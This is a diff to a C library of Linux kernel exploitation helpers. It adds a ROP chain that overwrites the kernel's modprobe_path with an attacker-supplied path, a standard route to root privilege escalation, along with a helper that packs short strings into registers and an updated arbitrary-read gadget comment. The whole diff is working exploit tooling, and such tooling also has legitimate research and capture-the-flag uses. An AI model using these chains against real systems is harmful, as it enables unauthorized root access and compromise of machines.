@@ -94,12 +94,36 @@ size_t chain_swapgs_iretq(rop_buffer_t rop,
     return i;
 }
 
+/* ============= modprobe ============= */
+size_t chain_modprobe_path(rop_buffer_t rop,
+                        uintptr_t modprobe_path_addr,
+                        const char *fake_modprobe_path,
+                        uintptr_t pop_rdi_ret,
+                        uintptr_t pop_rax_ret,
+                        rop_buffer_t mov_deref_rdi_rax_rop)
+{
+    size_t i = 0;
+ 	
+	uint64_t le_path = encode_string_as_le64(fake_modprobe_path);
+
+    PUSH_ROP(rop, i, pop_rax_ret);
+    PUSH_ROP(rop, i, le_path);
+    PUSH_ROP(rop, i, pop_rdi_ret);
+    PUSH_ROP(rop, i, modprobe_path_addr);
+
+    // Write rax into [rdi]
+    for (size_t j = 0; j < mov_deref_rdi_rax_rop.count; ++j) {
+        PUSH_ROP(rop, i, mov_deref_rdi_rax_rop.chain[j]);
+    }
+
+    return i;
+}
 
 /* ============= Arbitrary Read  =============
  * Read arbitrary memory stored in a ptr
  *      pop rax; ret;
  *      target_ptr;
- *      mov rax (eax), [rax]; (pop rbp;) ret; 
+ *      mov rax, [rax]; ret;
  *      kpti_trampoline;
  *      ...
  *      user_rip = asm that moves rax to a variable, then we can leak it.
@@ -165,4 +189,18 @@ size_t concat_rop_list(rop_buffer_t dst,
     return *dst_off;
 }
 
+/* Converts a short string (≤ 7 bytes) into a uint64_t LE encoded value to fit a reg */
+uint64_t encode_string_as_le64(const char *s)
+{   
+    size_t len = strlen(s);
+    if (len > 7) {
+        DIE("String too long for ROP write into a register\n");
+    }
 
+    uint64_t encoded = 0;
+    for (size_t i = 0; i < len; i++) {
+        encoded |= ((uint64_t)(uint8_t)s[i]) << (i * 8);
+    }
+
+    return encoded;
+}
